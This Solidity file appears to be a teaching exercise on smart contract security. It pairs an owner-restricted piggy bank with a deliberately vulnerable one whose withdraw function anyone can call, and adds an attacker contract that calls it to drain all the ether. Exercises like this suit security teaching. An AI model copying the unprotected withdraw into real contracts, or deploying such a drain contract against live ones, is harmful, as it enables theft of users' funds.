// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// Identify and fix the vulnerabilities in this simple smart contract to make it secure. 
contract SecurePiggyBank {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // Only the contract owner can withdraw the balance.
    // Still not ideal but it's a simple solution.
    // The best solution is the Vault system, where each user can withdraw at most the balance they deposited.
    modifier onlyOwner() {
        require(msg.sender == owner, "Not contract owner");
        _;
    }

    function deposit() public payable {}

    function withdraw() onlyOwner public {
        payable(msg.sender).transfer(address(this).balance);
    }

}

contract VulnerablePiggyBank {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    // Vulnerable!! Anyone can call this method to withdraw all funds!!
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Placeholder function
    function attack() public {}
}

// Add your custom attack function to attack the smart contract and call the withdraw function.
contract Attacker {

    VulnerablePiggyBank piggyContract;

    constructor(address _piggyAddress) {
        // Provide the target contract address on deployment:
        piggyContract = VulnerablePiggyBank(_piggyAddress);
    }

    function attack() public {
        // Withdraw all PiggyBank ether to the Attacker contract.
        piggyContract.withdraw();
    }

    // Allow receiving ether.
    receive() external payable {
        // We would also forward the funds to the Arracker's deployer address (EOA).
    }

}
